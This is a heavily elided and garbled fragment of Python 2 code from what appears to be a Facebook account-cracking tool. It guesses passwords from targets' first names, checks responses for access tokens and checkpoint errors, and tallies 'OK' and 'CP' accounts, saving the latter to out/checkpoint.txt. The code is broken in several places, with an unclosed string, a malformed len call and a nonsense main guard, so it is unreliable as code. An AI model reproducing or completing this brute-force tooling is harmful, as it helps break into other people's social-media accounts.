...
def pilih_super():
								...
								if 'www.facebook.com' in q["error_msg"]:
									...
									if 'access_token' in q:
										...
										if 'www.facebook.com' in q["error_msg"]:
											...
											pass5 = b['first_name'] + 'waqar bozdar
	...
	print"\033[1;96m[+] \033[1;92mTotal OK\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len ckg
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()
if __name__ == waqar bozdar
	login()
